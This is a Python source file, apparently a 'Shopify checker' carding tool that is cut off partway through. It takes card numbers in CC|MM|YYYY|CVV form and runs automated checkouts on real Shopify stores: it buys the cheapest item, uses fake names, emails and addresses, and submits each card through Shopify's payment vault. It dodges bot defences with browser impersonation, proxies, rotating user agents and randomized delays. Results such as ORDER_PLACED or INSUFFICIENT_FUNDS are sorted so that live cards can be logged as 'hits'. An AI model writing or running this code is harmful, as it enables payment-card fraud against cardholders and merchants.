import asyncio
import json
import re
import random
import threading
import os
import logging
import time
from urllib.parse import urlparse
from typing import Tuple, Dict, Any, Optional
from flask import Flask, request, jsonify

from curl_cffi.requests import AsyncSession, RequestsError
from graphql import QUERY_PROPOSAL_SHIPPING, QUERY_PROPOSAL_DELIVERY, MUTATION_SUBMIT, QUERY_POLL

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger("shopify_checker")

ADDRESS_BOOK = {
    "US": {"address1": "1201 N Market St", "address2": "Suite 100", "city": "Wilmington", "zoneCode": "DE", "postalCode": "19801", "countryCode": "US", "phone": "+13025550143"},
    "CA": {"address1": "700 2 St SW", "address2": "", "city": "Calgary", "zoneCode": "AB", "postalCode": "T2P 2W2", "countryCode": "CA", "phone": "+14035550187"},
    "GB": {"address1": "100 New Bridge St", "address2": "", "city": "London", "zoneCode": "LND", "postalCode": "EC4V 6JA", "countryCode": "GB", "phone": "+442079460912"},
    "AU": {"address1": "100 George St", "address2": "", "city": "Sydney", "zoneCode": "NSW", "postalCode": "2000", "countryCode": "AU", "phone": "+61291234567"},
    "DE": {"address1": "Friedrichstraße 43", "address2": "", "city": "Berlin", "zoneCode": "BE", "postalCode": "10117", "countryCode": "DE", "phone": "+493012345678"},
    "FR": {"address1": "8 Boulevard de la Madeleine", "address2": "", "city": "Paris", "zoneCode": "IDF", "postalCode": "75009", "countryCode": "FR", "phone": "+33142685300"},
    "IN": {"address1": "Bandra Kurla Complex", "address2": "", "city": "Mumbai", "zoneCode": "MH", "postalCode": "400051", "countryCode": "IN", "phone": "+919820012345"},
    "AE": {"address1": "Sheikh Zayed Rd", "address2": "", "city": "Dubai", "zoneCode": "DU", "postalCode": "00000", "countryCode": "AE", "phone": "+97143321111"},
    "DEFAULT": {"address1": "1201 N Market St", "address2": "Suite 100", "city": "Wilmington", "zoneCode": "DE", "postalCode": "19801", "countryCode": "US", "phone": "+13025550143"}
}

CURRENCY_TO_COUNTRY = {
    "USD": "US", "CAD": "CA", "GBP": "GB", "AUD": "AU", "EUR": "DE", "INR": "IN", "AED": "AE", "HKD": "HK", "CHF": "CH", "NZD": "NZ", "SGD": "SG", "JPY": "JP"
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

_VARIANT_CACHE = {}
_cache_lock = threading.Lock()
_file_lock = threading.Lock()
_HITS_FILE = '/sock/hits.txt' if os.path.isdir('/sock') else 'hits.txt'

class Utils:
    @staticmethod
    def get_random_name() -> Tuple[str, str]:
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Jennifer", "Patricia", "Mary", "Linda"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        return random.choice(first_names), random.choice(last_names)
    
    @staticmethod
    def generate_email(first: str, last: str) -> str:
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        num = random.randint(100, 9999)
        return f"{first.lower()}.{last.lower()}{num}@{random.choice(domains)}"

def resolve_address(url: str, currency: Optional[str] = None) -> Dict[str, str]:
    domain = urlparse(url if url.startswith("http") else f"https://{url}").netloc.lower()
    tld = domain.split(".")[-1].upper()
    if tld in ADDRESS_BOOK: return ADDRESS_BOOK[tld]
    if currency:
        country_code = CURRENCY_TO_COUNTRY.get(currency.upper())
        if country_code and country_code in ADDRESS_BOOK: return ADDRESS_BOOK[country_code]
    return ADDRESS_BOOK["DEFAULT"]

def extract_between(text: str, start: str, end: str) -> Optional[str]:
    if not text or not start or not end: return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]: return parts[1].split(end, 1)[0]
    except: pass
    return None

def parse_proxy(proxy_str: str) -> Optional[str]:
    if not proxy_str: return None
    proxy_str = proxy_str.strip()
    if proxy_str.startswith(("http://", "https://", "socks5://")): return proxy_str
    if '@' in proxy_str: return f"http://{proxy_str}"
    parts = proxy_str.split(':')
    if len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

def get_curl_proxy(proxy_str: str) -> Optional[Dict[str, str]]:
    p = parse_proxy(proxy_str)
    if p: return {"http": p, "https": p}
    return None

def is_captcha_required(response_text: str) -> bool:
    if not response_text: return False
    indicators = ['captcha', 'challenge', 'hcaptcha', 'turnstile', 'datadome', 'javascript required', 'cf_clearance', 'bot']
    return any(ind in response_text.lower() for ind in indicators)

def extract_clean_response(message: str) -> str:
    if not message: return "UNKNOWN_ERROR"
    message = str(message)
    if "GraphQL Error:" in message: return message[:150].strip()
    patterns = [r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)', r'([A-Z]+_[A-Z]+_[A-Z_]+)', r'([A-Z]+_[A-Z_]+)', r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?']
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        if matches:
            match = matches[0]
            if isinstance(match, tuple): match = match[0]
            if "_" in match and len(match) < 50: return match.strip("{}:'\" ")
    return message[:60]

def parse_cc_string(cc_string: str) -> Dict[str, str]:
    parts = cc_string.split('|')
    if len(parts) != 4: raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {'cc': parts[0].strip(), 'mes': parts[1].strip(), 'ano': parts[2].strip(), 'cvv': parts[3].strip()}

def _classify_status(success: bool, response_text: str) -> Optional[str]:
    if not response_text: return None
    upper = response_text.upper()
    if "ORDER_PLACED" in upper: return "ORDER_PLACED"
    if "INSUFFICIENT_FUNDS" in upper: return "INSUFFICIENT_FUNDS"
    if "OTP" in upper or "3DS" in upper or "AUTHENTICATION_REQUIRED" in upper: return "OTP_REQUIRED"
    return None

class ShopifyCheckoutSession:
    def __init__(self, site_url: str, cc_info: Dict[str, str], variant_id: Optional[str] = None):
        if site_url.startswith('http://'): self.site_url = site_url.replace('http://', 'https://')
        elif not site_url.startswith('https://'): self.site_url = f'https://{site_url}'
        else: self.site_url = site_url
            
        self.domain = urlparse(self.site_url).netloc
        self.cc_info = cc_info
        self.variant_id = variant_id
        self.checkout_url = None
        
        # User identity
        first, last = Utils.get_random_name()
        self.firstName, self.lastName = first, last
        self.email = Utils.generate_email(first, last)
        self.user_agent = random.choice(USER_AGENTS)
        
        # Address
        address = resolve_address(self.site_url)
        self.phone = address["phone"]
        self.street = address["address1"]
        self.address2 = address["address2"]
        self.city = address["city"]
        self.state = address["zoneCode"]
        self.s_zip = address["postalCode"]
        self.country_code = address["countryCode"]
        
        # Session state
        self.sst = None
        self.queueToken = ""
        self.stableId = "1"
        self.merch = ""
        self.currency = "USD"
        self.subtotal = "0.01"
        self.tax_amount = "0.00"
        self.shipping_amount = "0.00"
        self.running_total = "0.01"
        self.delivery_strategy = ""
        self.payment_identifier = ""
        self.gateway = "UNKNOWN"
        self.checkpoint_data = None
        self.attempt_token = ""
        self.build_id = None
        self.source_token = None
        self.ident_sig = None

    def get_headers(self, referer: str = None) -> Dict[str, str]:
        """Universal header factory."""
        h = {
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        if referer: h['Referer'] = referer
        return h

    def get_graphql_headers(self) -> Dict[str, str]:
        """GraphQL request headers."""
        return {
            'User-Agent': self.user_agent,
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Origin': self.site_url,
            'Referer': f"{self.site_url}/checkout",
            'X-Requested-With': 'XMLHttpRequest',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }

    async def fetch_product_if_needed(self, session) -> Tuple[bool, str]:
        if self.variant_id: return True, "OK"
        with _cache_lock:
            if self.site_url in _VARIANT_CACHE:
                self.variant_id = _VARIANT_CACHE[self.site_url]
                return True, "OK"

        endpoints = [f"{self.site_url}/products.json?limit=250", f"{self.site_url}/collections/all/products.json?limit=250"]
        min_price = float('inf')
        min_variant = None
        
        for endpoint in endpoints:
            try:
                resp = await session.get(endpoint, timeout=15, headers=self.get_headers())
                if resp.status_code != 200: continue
                data = resp.json()
                for product in data.get('products', []):
                    for variant in product.get('variants', []):
                        if not variant.get('available', True): continue
                        try:
                            price = float(variant.get('price', 999999))
                            if price > 0 and price < min_price:
                                min_price = price
                                min_variant = str(variant['id'])
                        except: pass
            except: pass
                
        if min_variant:
            self.variant_id = min_variant
            with _cache_lock: _VARIANT_CACHE[self.site_url] = self.variant_id
            return True, "OK"
        return False, "No products available"

    async def add_to_cart(self, session) -> Tuple[bool, str]:
        try:
            cart_url = self.site_url + '/cart/add.js'
            h = self.get_headers(f"{self.site_url}/")
            h['Content-Type'] = 'application/x-www-form-urlencoded'
            h['Sec-Fetch-Dest'] = 'empty'
            h['Sec-Fetch-Mode'] = 'cors'
            
            resp = await session.post(cart_url, data=f'id={self.variant_id}&quantity=1', headers=h, timeout=15)
            if resp.status_code == 200: return True, "OK"
            
            h['Content-Type'] = 'application/json'
            r2 = await session.post(cart_url, json={'items': [{'id': int(self.variant_id), 'quantity': 1}]}, headers=h, timeout=15)
            return (True, "OK") if r2.status_code == 200 else (False, f"Cart failed {r2.status_code}")
        except Exception as e:
            return False, f"Add to cart: {str(e)}"

    async def init_checkout(self, session) -> Tuple[bool, str]:
        try:
            h = self.get_headers(f"{self.site_url}/cart")
            resp = await session.get(self.site_url + '/checkout', headers=h, allow_redirects=True, timeout=20)
            
            text = resp.text
            if is_captcha_required(text): return False, "CAPTCHA_REQUIRED"
            if resp.status_code in (403, 429): return False, "CAPTCHA_REQUIRED"
            
            self.checkout_url = str(resp.url)
            url_lower = self.checkout_url.lower()
            if 'login' in url_lower: return False, "Site requires login"
            if 'password' in url_lower: return False, "Site password protected"
            if '/cart' in url_lower and '/checkouts' not in url_lower: return False, "Cart (OOS or empty)"

            match = re.search(r'/checkouts/(?:c|cn|unstable)/([^/?]+)', self.checkout_url)
            self.attempt_token = match.group(1) if match else self.checkout_url.split('/')[-1].split('?')[0]
            
            self.sst = resp.headers.get('X-Checkout-One-Session-Token') or resp.headers.get('x-checkout-one-session-token')
            if not self.sst:
                patterns = [
                    r'name="serialized-sessionToken"\s+content="([^"]+)"',
                    r'"sessionToken"\s*:\s*"([^"]+)"',
                    r'data-session-token="([^"]+)"',
                    r'"serializedSessionToken"\s*:\s*"([^"]+)"'
                ]
                for p in patterns:
                    m = re.search(p, text)
                    if m:
                        self.sst = m.group(1).replace('&quot;', '')
                        break
            
            if not self.sst: return False, "No session token"
            
            self.queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"') or ""
            self.stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"') or "1"
            self.merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or str(self.variant_id)
            self.currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or extract_between(text, '"currencyCode":"', '"') or 'USD'
            
            self.subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            if not self.subtotal:
                pm = re.search(r'"price":\s*"([\d.]+)"', text)
                self.subtotal = pm.group(1) if pm else "0.01"

            b_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', text)
            self.build_id = b_match.group(1) if b_match else None
            
            s_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            self.source_token = s_token.replace('&quot;', '').strip('"') if s_token else None
            
            return True, "OK"
        except Exception as e:
            return False, f"Init checkout: {str(e)}"

    async def _graphql_req(self, session, json_data, retries=2) -> Tuple[bool, str]:
        """Single point for all GraphQL requests."""
        url = f'https://{self.domain}/checkouts/unstable/graphql'
        headers = self.get_graphql_headers()
        params = {'operationName': json_data.get('operationName', '')}
        
        for attempt in range(retries + 1):
            try:
                resp = await session.post(url, json=json_data, headers=headers, params=params, timeout=25)
                text = resp.text
                
                if is_captcha_required(text): return False, "CAPTCHA_REQUIRED"
                if resp.status_code != 200: return False, f"HTTP {resp.status_code}"
                
                return True, text
            except asyncio.TimeoutError:
                if attempt == retries: return False, "Timeout"
                await asyncio.sleep(random.uniform(2, 4))
            except Exception as e:
                if attempt == retries: return False, str(e)
                await asyncio.sleep(random.uniform(2, 4))
        
        return False, "Max retries"

    async def negotiate_shipping(self, session) -> Tuple[bool, str]:
        """Get shipping rates and available options."""
        json_data = {
            'operationName': 'Proposal',
            'query': QUERY_PROPOSAL_SHIPPING,
            'variables': {
                'sessionInput': {'sessionToken': self.sst},
                'queueToken': self.queueToken,
                'checkpointData': self.checkpoint_data,
                'delivery': {
                    'deliveryLines': [{
                        'destination': {'partialStreetAddress': {'address1': self.street, 'address2': self.address2, 'city': self.city, 'countryCode': self.country_code, 'postalCode': self.s_zip, 'zoneCode': self.state}},
                        'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}},
                        'targetMerchandiseLines': {'lines': [{'stableId': self.stableId}]},
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {'any': True},
                        'destinationChanged': True
                    }],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': False,
                    'supportsSplitShipping': True
                },
                'merchandise': {
                    'merchandiseLines': [{
                        'stableId': self.stableId,
                        'merchandise': {
                            'productVariantReference': {
                                'id': f'gid://shopify/ProductVariantMerchandise/{self.merch}',
                                'variantId': f'gid://shopify/ProductVariant/{self.variant_id}',
                                'properties': [],
                                'sellingPlanId': None
                            }
                        },
                        'quantity': {'items': {'value': 1}},
                        'expectedTotalPrice': {'any': True}
                    }]
                },
                'payment': {
                    'totalAmount': {'any': True},
                    'paymentLines': [],
                    'billingAddress': {'streetAddress': {'address1': '', 'address2': '', 'city': '', 'countryCode': self.country_code, 'postalCode': '', 'firstName': '', 'lastName': '', 'zoneCode': '', 'phone': ''}}
                },
                'buyerIdentity': {
                    'customer': {'presentmentCurrency': self.currency, 'countryCode': self.country_code},
                    'email': self.email,
                    'emailChanged': False,
                    'phoneCountryCode': self.country_code,
                    'marketingConsent': [{'email': {'value': self.email}}],
                    'shopPayOptInPhone': {'number': self.phone, 'countryCode': self.country_code},
                    'rememberMe': False
                },
                'taxes': {
                    'proposedAllocations': None,
                    'proposedTotalAmount': {'any': True},
                    'proposedExemptions': []
                },
                'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                'tip': {'tipLines': []},
                'note': {'message': None, 'customAttributes': []}
            }
        }
        
        for attempt in range(4):
            success, text = await self._graphql_req(session, json_data)
            if not success: return False, text
            
            try:
                data = json.loads(text)
                if 'errors' in data: 
                    errs = [e.get('message', e.get('code', 'ERROR')) for e in data['errors']]
                    return False, '; '.join(errs)
                
                result = data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                if not result: return False, "Empty result"
                
                if result.get('__typename') in ('CheckpointDenied', 'Throttled'): return False, result.get('__typename', 'Blocked')
                
                self.checkpoint_data = result.get('checkpointData')
                sp = result.get('sellerProposal', {})
                
                # Check for pending
                if sp.get('delivery', {}).get('__typename') == 'PendingTerms' or sp.get('tax', {}).get('__typename') == 'PendingTerms':
                    await asyncio.sleep(2.0)
                    continue
                
                # Extract shipping
                delivery = sp.get('delivery', {})
                if delivery.get('__typename') == 'FilledDeliveryTerms':
                    lines = delivery.get('deliveryLines', [])
                    if lines:
                        strats = lines[0].get('availableDeliveryStrategies', [])
                        if strats:
                            cheapest = min(strats, key=lambda s: float(s.get('amount', {}).get('value', {}).get('amount', '999999')))
                            self.delivery_strategy = cheapest.get('handle', '')
                            amt = cheapest.get('amount', {}).get('value', {}).get('amount')
                            if amt: self.shipping_amount = str(amt)
                
                # Extract tax
                tax = sp.get('tax', {})
                if tax.get('__typename') == 'FilledTaxTerms':
                    t_amt = tax.get('totalTaxAmount', {}).get('value', {}).get('amount')
                    if t_amt: self.tax_amount = str(t_amt)
                
                # Extract running total
                rt = sp.get('runningTotal', {})
                if rt.get('value', {}).get('amount'):
                    self.running_total = str(rt['value']['amount'])
                
                # Extract payment
                payment = sp.get('payment', {})
                if payment.get('__typename') == 'FilledPaymentTerms':
                    for method in payment.get('availablePaymentLines', []):
                        pm = method.get('paymentMethod', {})
                        if pm.get('paymentMethodIdentifier'):
                            self.payment_identifier = pm.get('paymentMethodIdentifier')
                            self.gateway = pm.get('name', 'UNKNOWN')
                            break
                
                if not self.payment_identifier: return False, "No CC gateway"
                return True, "OK"
            except Exception as e:
                return False, f"Parse: {str(e)}"
        
        return False, "Shipping timeout"

    async def negotiate_delivery(self, session) -> Tuple[bool, str]:
        """Confirm delivery strategy."""
        if not self.delivery_strategy: return True, "OK"
        
        json_data = {
            'operationName': 'Proposal',
            'query': QUERY_PROPOSAL_DELIVERY,
            'variables': {
                'sessionInput': {'sessionToken': self.sst},
                'queueToken': self.queueToken,
                'checkpointData': self.checkpoint_data,
                'delivery': {
                    'deliveryLines': [{
                        'destination': {'streetAddress': {'address1': self.street, 'address2': self.address2, 'city': self.city, 'countryCode': self.country_code, 'postalCode': self.s_zip, 'firstName': self.firstName, 'lastName': self.lastName, 'zoneCode': self.state, 'phone': self.phone}},
                        'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': self.delivery_strategy, 'customDeliveryRate': False}, 'options': {}},
                        'targetMerchandiseLines': {'lines': [{'stableId': self.stableId}]},
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {'any': True},
                        'destinationChanged': False
                    }],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': False,
                    'supportsSplitShipping': True
                },
                'merchandise': {
                    'merchandiseLines': [{
                        'stableId': self.stableId,
                        'merchandise': {
                            'productVariantReference': {
                                'id': f'gid://shopify/ProductVariantMerchandise/{self.merch}',
                                'variantId': f'gid://shopify/ProductVariant/{self.variant_id}',
                                'properties': [],
                                'sellingPlanId': None
                            }
                        },
                        'quantity': {'items': {'value': 1}},
                        'expectedTotalPrice': {'any': True}
                    }]
                },
                'payment': {
                    'totalAmount': {'any': True},
                    'paymentLines': [],
                    'billingAddress': {'streetAddress': {'address1': '', 'address2': '', 'city': '', 'countryCode': self.country_code, 'postalCode': '', 'firstName': '', 'lastName': '', 'zoneCode': '', 'phone': ''}}
                },
                'buyerIdentity': {
                    'customer': {'presentmentCurrency': self.currency, 'countryCode': self.country_code},
                    'email': self.email,
                    'emailChanged': False,
                    'phoneCountryCode': self.country_code,
                    'marketingConsent': [{'email': {'value': self.email}}],
                    'shopPayOptInPhone': {'number': self.phone, 'countryCode': self.country_code},
                    'rememberMe': False
                },
                'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'any': True}, 'proposedExemptions': []},
                'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                'tip': {'tipLines': []},
                'note': {'message': None, 'customAttributes': []}
            }
        }
        
        success, text = await self._graphql_req(session, json_data, retries=1)
        if not success: return False, text
        
        try:
            data = json.loads(text)
            if 'errors' in data: return False, data['errors'][0].get('message', 'GraphQL error')
            
            result = data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
            if result.get('__typename') in ('CheckpointDenied', 'Throttled'): return False, "Blocked"
            
            self.checkpoint_data = result.get('checkpointData')
            return True, "OK"
        except:
            return True, "OK"

    async def tokenize_card(self, session) -> Tuple[bool, str]:
        """Send card to Shopify vault."""
        payload = {
            "credit_card": {
                "number": self.cc_info['cc'],
                "month": int(self.cc_info['mes']),
                "year": int(self.cc_info['ano']),
                "verification_value": self.cc_info['cvv'],
                "name": f"{self.firstName} {self.lastName}",
                "start_month": None,
                "start_year": None,
                "issue_number": ""
            },
            "payment_session_scope": self.domain
        }
        
        headers = {
            'User-Agent': self.user_agent,
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': 'https://checkout.pci.shopifyinc.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
        }
        
        try:
            resp = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=headers, timeout=20)
            
            if resp.status_code not in (200, 201): return False, f"Vault {resp.status_code}"
            
            data = resp.json()
            token = data.get('id')
            if not token: return False, "No token from vault"
            
            return True, token
        except Exception as e:
            return False, f"Tokenize: {str(e)}"

    async def submit_payment(self, session, token: str) -> Tuple[bool, str, str]:
        """Submit payment."""
        submit_vars = {
            'input': {
                'sessionInput': {'sessionToken': self.sst},
                'queueToken': self.queueToken,
                'checkpointData': self.checkpoint_data,
                'delivery': {
                    'deliveryLines': [{
                        'destination': {'streetAddress': {'address1': self.street, 'address2': self.address2, 'city': self.city, 'countryCode': self.country_code, 'postalCode': self.s_zip, 'firstName': self.firstName, 'lastName': self.lastName, 'zoneCode': self.state, 'phone': self.phone}},
                        'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': self.delivery_strategy, 'customDeliveryRate': False}, 'options': {}},
                        'targetMerchandiseLines': {'lines': [{'stableId': self.stableId}]},
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {'any': True},
                        'destinationChanged': False
                    }] if self.delivery_strategy else [],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': True,
                    'supportsSplitShipping': True
                },
                'merchandise': {
                    'merchandiseLines': [{
                        'stableId': self.stableId,
                        'merchandise': {
                            'productVariantReference': {
                                'id': f'gid://shopify/ProductVariantMerchandise/{self.merch}',
                                'variantId': f'gid://shopify/ProductVariant/{self.variant_id}',
                                'properties': [],
                                'sellingPlanId': None
                            }
                        },
                        'quantity': {'items': {'value': 1}},
                        'expectedTotalPrice': {'any': True}
                    }]
                },
                'payment': {
                    'totalAmount': {'any': True},
                    'paymentLines': [{
                        'paymentMethod': {
                            'directPaymentMethod': {
                                'paymentMethodIdentifier': self.payment_identifier,
                                'sessionId': token,
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': self.street,
                                        'address2': self.address2,
                                        'city': self.city,
                                        'countryCode': self.country_code,
                                        'postalCode': self.s_zip,
                                        'firstName': self.firstName,
                                        'lastName': self.lastName,
                                        'zoneCode': self.state,
                                        'phone': self.phone
                                    }
                                },
                                'cardSource': None
                            }
                        },
                        'amount': {'value': {'amount': self.running_total, 'currencyCode': self.currency}},
                        'dueAt': None
                    }],
                    'billingAddress': {'streetAddress': {'address1': self.street, 'address2': self.address2, 'city': self.city, 'countryCode': self.country_code, 'postalCode': self.s_zip, 'firstName': self.firstName, 'lastName': self.lastName, 'zoneCode': self.state, 'phone': self.phone}}
                },
                'buyerIdentity': {
                    'customer': {'presentmentCurrency': self.currency, 'countryCode': self.country_code},
                    'email': self.email,
                    'emailChanged': False,
                    'phoneCountryCode': self.country_code,
                    'marketingConsent': [{'email': {'value': self.email}}],
                    'shopPayOptInPhone': {'number': self.phone, 'countryCode': self.country_code},
                    'rememberMe': False
                },
                'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'any': True}, 'proposedExemptions': []},
                'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                'tip': {'tipLines': []},
                'note': {'message': None, 'customAttributes': []}
            },
            'attemptToken': self.attempt_token,
            'metafields': [],
            'analytics': {'requestUrl': self.checkout_url}
        }
        
        json_data = {
            'operationName': 'SubmitForCompletion',
            'query': MUTATION_SUBMIT,
            'variables': submit_vars
        }
        
        success, text = await self._graphql_req(session, json_data)
        if not success: return False, text, ""
        
        try:
            data = json.loads(text)
            if 'errors' in data: return False, data['errors'][0].get('message', 'GQL error'), ""
            
            submit_result = data.get('data', {}).get('submitForCompletion', {})
            if not submit_result: return False, "No submit result", ""
            
            typename = submit_result.get('__typename', '')
            
            if typename in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted'):
                receipt = submit_result.get('receipt', {})
                if receipt.get('__typename') == 'ProcessedReceipt':
                    return True, "ORDER_PLACED", ""
                rid = receipt.get('id', '')
                return (True, "POLL", rid) if rid else (False, "No receipt ID", "")
            
            elif typename == 'SubmitFailed':
                return False, extract_clean_response(submit_result.get('reason', 'Failed')), ""
            
            elif typename == 'SubmitRejected':
                errs = submit_result.get('errors', [])
                if errs: return False, errs[0].get('code', 'Rejected'), ""
                return False, "Rejected", ""
            
            return False, typename, ""
        except Exception as e:
            return False, f"Parse submit: {str(e)}", ""

    async def poll_receipt(self, session, receipt_id: str) -> Tuple[bool, str]:
        """Poll for payment result."""
        if not receipt_id: return False, "NO_RECEIPT"
        
        json_data = {
            'operationName': 'PollForReceipt',
            'query': QUERY_POLL,
            'variables': {
                'receiptId': receipt_id,
                'sessionToken': self.sst
            }
        }
        
        for poll_attempt in range(20):
            await asyncio.sleep(random.uniform(2.0, 3.5))
            
            success, text = await self._graphql_req(session, json_data, retries=1)
            if not success: return False, text
            
            try:
                data = json.loads(text)
                if 'errors' in data: return False, data['errors'][0].get('message', 'Poll error')
                
                receipt = data.get('data', {}).get('receipt', {})
                typename = receipt.get('__typename', '')
                
                if typename == 'ProcessedReceipt': return True, "ORDER_PLACED"
                elif typename == 'ActionRequiredReceipt': return True, "OTP_REQUIRED"
                elif typename == 'FailedReceipt':
                    err = receipt.get('processingError', {})
                    code = err.get('code', err.get('__typename', 'PAYMENT_FAILED'))
                    msg = err.get('message')
                    return False, msg if msg else code
                elif typename in ('ProcessingReceipt', 'WaitingReceipt'):
                    continue
                else:
                    break
            except:
                pass
        
        return False, "POLL_TIMEOUT"

async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None) -> Tuple[bool, str, str, str, str, str, str, str]:
    cc_info = {'cc': cc, 'mes': mes, 'ano': ano, 'cvv': cvv}
    checkout = ShopifyCheckoutSession(site_url, cc_info, variant_id)
    proxies = get_curl_proxy(proxy_str)
    
    try:
        async with AsyncSession(impersonate="chrome124", proxies=proxies, timeout=60) as session:
            
            # Warmup phase
            try:
                resp = await session.get(checkout.site_url, headers=checkout.get_headers(), timeout=15, allow_redirects=True)
                final_url = str(resp.url).split('?')[0].rstrip('/')
                checkout.site_url = final_url
                checkout.domain = urlparse(final_url).netloc
                
                await asyncio.sleep(random.uniform(2.0, 3.5))
                await session.get(f"{checkout.site_url}/cart", headers=checkout.get_headers(), timeout=10)
                await asyncio.sleep(random.uniform(2.0, 3.5))
            except:
                pass
            
            # Product fetch
            ok, msg = await checkout.fetch_product_if_needed(session)
            if not ok: return False, msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            # Add to cart
            ok, msg = await checkout.add_to_cart(session)
            if not ok:
                with _cache_lock:
                    if checkout.site_url in _VARIANT_CACHE: del _VARIANT_CACHE[checkout.site_url]
                checkout.variant_id = None
                ok, msg = await checkout.fetch_product_if_needed(session)
                if ok: ok, msg = await checkout.add_to_cart(session)
                if not ok: return False, msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            await asyncio.sleep(random.uniform(3.0, 5.0))
            
            # Init checkout
            ok, msg = await checkout.init_checkout(session)
            if not ok: return False, msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            await asyncio.sleep(random.uniform(2.0, 3.5))
            
            # Negotiate shipping
            ok, msg = await checkout.negotiate_shipping(session)
            if not ok: return False, msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            await asyncio.sleep(random.uniform(1.5, 2.5))
            
            # Negotiate delivery
            ok, msg = await checkout.negotiate_delivery(session)
            if not ok: return False, msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            await asyncio.sleep(random.uniform(1.5, 2.5))
            
            # Tokenize
            ok, token_msg = await checkout.tokenize_card(session)
            if not ok: return False, token_msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            await asyncio.sleep(random.uniform(1.0, 2.0))
            
            # Submit
            ok, status, rid = await checkout.submit_payment(session, token_msg)
            if not ok: return False, status, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            if status != "POLL": return ok, status, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            # Poll
            ok, final = await checkout.poll_receipt(session, rid)
            return ok, final, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount

    except RequestsError as e:
